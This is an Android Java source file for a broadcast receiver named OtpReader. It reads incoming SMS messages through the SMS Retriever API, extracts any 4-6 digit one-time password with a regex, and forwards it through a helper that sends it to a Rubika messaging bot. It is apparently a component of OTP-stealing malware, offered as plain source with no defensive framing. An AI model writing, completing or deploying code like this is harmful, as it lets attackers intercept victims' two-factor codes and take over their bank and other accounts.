package com.security.ravan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import com.google.android.gms.auth.api.phone.SmsRetriever;
import com.google.android.gms.auth.api.phone.SmsRetrieverClient;
import com.google.android.gms.tasks.Task;

public class OtpReader extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (SmsRetriever.SMS_RETRIEVED_ACTION.equals(intent.getAction())) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                String message = extras.getString(SmsRetriever.EXTRA_SMS_MESSAGE);
                if (message != null) {
                    String otp = extractOtp(message);
                    HttpServerService.sendToRubikaBot("📱 OTP detected: " + otp);
                }
            }
        }
    }
    
    private String extractOtp(String message) {
        // استخراج عدد 4-6 رقمی از پیام
        java.util.regex.Pattern p = java.util.regex.Pattern.compile("\\b\\d{4,6}\\b");
        java.util.regex.Matcher m = p.matcher(message);
        if (m.find()) {
            return m.group();
        }
        return "not found";
    }
}
